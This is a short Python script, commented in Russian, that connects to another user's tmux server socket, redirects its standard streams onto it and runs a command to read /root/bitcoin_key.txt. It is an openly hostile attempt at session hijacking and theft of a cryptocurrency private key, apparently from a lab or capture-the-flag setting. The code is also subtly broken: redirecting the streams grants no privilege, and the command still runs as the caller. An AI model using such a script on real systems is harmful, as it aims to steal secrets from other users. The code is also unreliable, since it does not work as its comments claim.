import socket
import os
import subprocess
import sys

# Создание UNIX-сокета
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

try:
    # Подключение к tmux-сокету
    s.connect("/tmp/tmux-100/default")

    # Перенаправление ввода-вывода
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Выполнение команды и захват вывода
    result = subprocess.run(
        ["cat", "/root/bitcoin_key.txt"],
        capture_output=True,
        text=True
    )

    # Вывод результата команды
    print("Command output:")
    print(result.stdout)

    # Вывод ошибок, если они есть
    if result.stderr:
        print("Errors:", result.stderr, file=sys.stderr)

except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
    sys.exit(1)

finally:
    s.close()